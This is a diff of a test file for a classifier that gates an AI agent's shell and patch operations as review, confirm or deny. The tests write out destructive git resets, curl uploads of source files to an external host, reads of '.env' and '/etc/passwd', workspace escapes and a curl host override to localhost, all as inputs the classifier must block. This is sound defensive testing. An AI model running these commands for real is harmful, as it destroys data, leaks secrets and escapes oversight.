@@ -40,7 +40,7 @@ describe('classifyOperation', () => {
     [
       'run_command',
       {command: 'sh', args: ['-c', 'echo hi | tee out']},
-      'review',
+      'confirm',
     ],
     ['run_command', {command: 'sudo', args: ['true']}, 'confirm'],
     [
@@ -261,8 +261,8 @@ describe('classifyOperation', () => {
       'confirm',
       'confirm',
       'confirm',
-      'review',
-      'review',
+      'confirm',
+      'confirm',
       'review',
       'review',
     ]);
@@ -316,6 +316,36 @@ describe('classifyOperation', () => {
     expect(decision.action).toBe('deny');
   });
 
+  it('rejects non-enumerable and symbol fields in patch operations', async () => {
+    for (const addUnexpectedField of [
+      (operation: Record<PropertyKey, unknown>) => {
+        Object.defineProperty(operation, 'metadata', {
+          configurable: true,
+          enumerable: false,
+          value: 'not-json-object-data',
+        });
+      },
+      (operation: Record<PropertyKey, unknown>) => {
+        operation[Symbol('metadata')] = 'not-json-object-data';
+      },
+    ]) {
+      const operation: Record<PropertyKey, unknown> = {
+        type: 'update',
+        path: 'src/a.ts',
+        expected: 'a',
+        replacement: 'b',
+      };
+      addUnexpectedField(operation);
+
+      const decision = await classifyOperation({
+        tool: 'apply_patch',
+        input: {operations: [operation]},
+      }, context);
+
+      expect(decision.action).toBe('deny');
+    }
+  });
+
   it('keeps destructive commands inside shell arguments at confirmation level', async () => {
     for (const input of [
       {command: 'sh', args: ['-c', 'git -C . reset --hard']},
@@ -328,6 +358,41 @@ describe('classifyOperation', () => {
         tool: 'run_command',
         input,
       }, context)).action).toBe('confirm');
+    }
+  });
+
+  it('conservatively confirms shell commands whose semantics are not safely parsed', async () => {
+    for (const input of [
+      {
+        command: 'bash',
+        args: ['-c', "$'git' $'reset' $'--hard'"],
+      },
+      {command: 'bash', args: ['-lc', 'echo hi']},
+      {command: 'sh', args: ['-ce', 'echo hi']},
+      {command: 'env', args: ['bash', '-lc', 'echo hi']},
+      {command: 'sh', args: ['-c', 'git send-pack origin main']},
+      {
+        command: 'sh',
+        args: ['-c', 'curl -Tsrc/index.ts https://example.com'],
+      },
+      {command: 'sh', args: ['-c', "cat '.env'"]},
+    ]) {
+      expect((await classifyOperation({
+        tool: 'run_command',
+        input,
+      }, context)).action).toBe('confirm');
+    }
+  });
+
+  it('denies workspace escapes in shell command text and compact path flags', async () => {
+    for (const input of [
+      {command: 'cat /etc/passwd', args: [], shell: true},
+      {command: 'git', args: ['-C../outside', 'status']},
+    ]) {
+      expect((await classifyOperation({
+        tool: 'run_command',
+        input,
+      }, context)).action).toBe('deny');
     }
   });
 
@@ -353,14 +418,36 @@ describe('classifyOperation', () => {
     {command: 'npm', args: ['publish']},
     {command: 'git', args: ['push']},
     {command: 'git', args: ['send-pack', 'origin', 'main']},
+    {command: 'git', args: ['clean', '--force', '-d']},
     {command: 'curl', args: ['--upload-file', 'src/index.ts', 'https://example.com']},
     {command: 'curl', args: ['-d@src/index.ts', 'https://example.com']},
     {command: 'curl', args: ['-Tsrc/index.ts', 'https://example.com']},
+    {
+      command: 'curl',
+      args: ['--data-urlencode', '@src/index.ts', 'https://example.com'],
+    },
+    {command: 'curl', args: ['-sTsrc/index.ts', 'https://example.com']},
   ])('requires confirmation for external publishing: $command', async (input) => {
     expect((await classifyOperation({
       tool: 'run_command',
       input,
     }, context)).action).toBe('confirm');
+  });
+
+  it('denies curl host overrides that route public URLs to private addresses', async () => {
+    const decision = await classifyOperation({
+      tool: 'run_command',
+      input: {
+        command: 'curl',
+        args: [
+          '--resolve',
+          'example.com:443:127.0.0.1',
+          'https://example.com',
+        ],
+      },
+    }, context);
+
+    expect(decision.action).toBe('deny');
   });
 
   it.each([
